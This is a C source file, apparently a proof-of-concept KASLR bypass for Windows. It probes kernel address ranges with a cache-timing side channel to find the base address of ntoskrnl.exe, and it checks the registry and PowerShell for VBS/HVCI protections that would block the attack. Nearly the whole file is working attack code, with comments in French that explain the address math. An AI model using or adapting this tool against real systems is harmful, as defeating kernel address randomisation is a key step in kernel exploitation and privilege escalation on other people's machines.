#include <stdio.h>
#include <stdint.h>
#include <windows.h>

// gcc nokaslr.c nokaslr.o -o nokaslr.exe

/*
https://msrc.microsoft.com/blog/2022/04/randomizing-the-kuser_shared_data-structure-on-windows/

0x0000000000000000 -> 0x00007FFFFFFFFFFF  -> Espace user-mode (128 To)
0xFFFF080000000000 -> 0xFFFFFFFFFFFFFFFF  -> Espace kernel-mode (128 To)

OLD exemple : 
kASLR load ntoskrnl.exe in a range of 0x800000000 (32Go)
aligned on 21bits => 0b100000000000000000000 => 0x100000 (1Mo)

so every 1Mb is a potential space of ntoskrn.exe : 
    range // step = 0x8000 : 32 768 possibilités
*/
#define START_KADDR 0xfffff80000000000ULL
#define STOP_KADDR 0xfffff80800000000ULL

#define KSTEP_SIZE  0x100000
#define KSTEPS ((STOP_KADDR - START_KADDR) / KSTEP_SIZE)
#define PASS_CNT 10

#define uint64 u_int64

//Si VBS est activé alors on mesure le cache virtuel et donc marche po
//Les addrs sont dans VTL1 (les instruction de VTL0 (prefetchnta/...) sont bloqué)
//La latence est aussi normalisée. :(
unsigned int cacheTiming(void* addr);

uint64 getKrnlBase(){
    uint64 timings[KSTEPS] = {0};
    uint64 addrs[KSTEPS] = {0};
    uint64 sum = 0;
    int valid = 0;
    uint64 first_block = 0;

    //Tour de chauffe + definition de la baseline 
    for (int i = 0; i < 0x100; i++)
        sum += cacheTiming((void*)0xdeadbeef);
    uint64 baseline = sum / 0x100;
    uint64 limit_min = baseline * 0.85;
    printf("[debug] Baseline : %llu\n", baseline);
    printf("[debug] Limit Min : %llu\n", limit_min);

    sum = 0;
    for (uint64 i = 0; i < KSTEPS; i++) {
        addrs[i] = START_KADDR + i * KSTEP_SIZE;

        for (int y = 0; y < PASS_CNT; y++){
            sum += cacheTiming((void*)(uintptr_t)addrs[i]);
        }
        unsigned int t = sum / PASS_CNT;
        sum = 0;
        
        timings[i] = t;
        if (t < limit_min) {
            if (valid == 0) {
                first_block = addrs[i];
            }
            valid++;
            if (valid == 12) {
                printf("[debug] %p ; %d\n", first_block, t);
                return first_block;
            } 
        } else {
            first_block = 0;
            valid = 0;
        }
    }

    return 0;
}


int get_cim_value(const char* ps_command) {
    char full_command[512];
    snprintf(full_command, sizeof(full_command),
        "powershell -Command \"%s\"", ps_command);

    FILE* fp = _popen(full_command, "r");
    if (!fp) {
        fprintf(stderr, "[-] Failed to run PowerShell :(\n");
        return -1;
    }

    char output[128];
    if (fgets(output, sizeof(output), fp) == NULL) {
        _pclose(fp);
        return -1;
    }

    _pclose(fp);

    return atoi(output);
}

// Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard
//     -> https://learn.microsoft.com/en-us/windows/security/hardware-security/enable-virtualization-based-protection-of-code-integrity?tabs=appcontrol

//https://learn.microsoft.com/en-us/windows/security/hardware-security/enable-virtualization-based-protection-of-code-integrity?tabs=reg
//https://connormcgarr.github.io/hvci/?utm_source=chatgpt.com
int VBSDetected() {
    HKEY hKey;
    DWORD value = 0;
    DWORD valueSize = sizeof(value);
    char full_command[512];
    char output[1];

    // Registry path: HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard\Scenarios\HypervisorEnforcedCodeIntegrity
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
        "SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\\Scenarios\\HypervisorEnforcedCodeIntegrity",
        0,
        KEY_READ,
        &hKey) == ERROR_SUCCESS) {

        if (RegQueryValueExA(hKey, "Enabled", NULL, NULL, (LPBYTE)&value, &valueSize) == ERROR_SUCCESS) {
            RegCloseKey(hKey);
            if (value == 1) {
                printf("[HVCI detected] Register ...\\HypervisorEnforcedCodeIntegrity : 1\n");
                return 1; // HVCI is enabled => VBS is active
            }
        }
        RegCloseKey(hKey);
    }
    printf("[HVCI not detected] Register ...\\HypervisorEnforcedCodeIntegrity : 0\n");

    // Registry path: HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard\EnableVirtualizationBasedSecurity
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
        "SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\\Scenarios\\EnableVirtualizationBasedSecurity",
        0,
        KEY_READ,
        &hKey) == ERROR_SUCCESS) {

        if (RegQueryValueExA(hKey, "Enabled", NULL, NULL, (LPBYTE)&value, &valueSize) == ERROR_SUCCESS) {
            RegCloseKey(hKey);
            if (value == 1) {
                printf("[HVCI detcted] Register ...\\EnableVirtualizationBasedSecurity : 1\n");
                return 1;
            }
        }
        RegCloseKey(hKey);
    }
    printf("[HVCI not detcted] Register ...\\EnableVirtualizationBasedSecurity : 0\n");

    
    //Detect HVCI
    if (get_cim_value("(Get-CimInstance -Namespace root\\Microsoft\\Windows\\DeviceGuard -ClassName Win32_DeviceGuard).CodeIntegrityPolicyEnforcementStatus") == 2){
        printf("[HVCI detected] CIM property CodeIntegrityPolicyEnforcementStatus enforced\n");
        return 1;
    } else {
        printf("[HVCI not detected] CIM property CodeIntegrityPolicyEnforcementStatus not enforced\n");
    }

    //Detect VBS
    if (get_cim_value("(Get-CimInstance -Namespace root\\Microsoft\\Windows\\DeviceGuard -ClassName Win32_DeviceGuard).VirtualizationBasedSecurityStatus") == 2){
        printf("[HVCI detected] CIM property CodeIntegrityPolicyEnforcementStatus enforced\n");
        return 1;
    } else {
        printf("[HVCI not detected] CIM property CodeIntegrityPolicyEnforcementStatus not enforced\n");
    }

    return 0;
}


int main(int argc, char** argv){
    uint64 ntoskrnl_base = 0;

    if (!VBSDetected()) {
        ntoskrnl_base = getKrnlBase();
    } else {
        char choice;
        printf("\n[!] VBS security detected  this side-channel attack will likely fail.\n");
        printf("[?] Do you want to still try anyway? (y/n): ");
        fflush(stdout);
        choice = getchar();

        if (tolower(choice) == 'y') {
            ntoskrnl_base = getKrnlBase();
            
        } else {
            printf("[*] Aborting attack due to VBS security.\n");
        }
    }
    if (ntoskrnl_base) {
        printf("[*] ntoskrnl base : 0x%llx\n", ntoskrnl_base);
    } else {
        printf("[-] No ntoskrn base candidate found.\n");
    }
    
    return 0;
}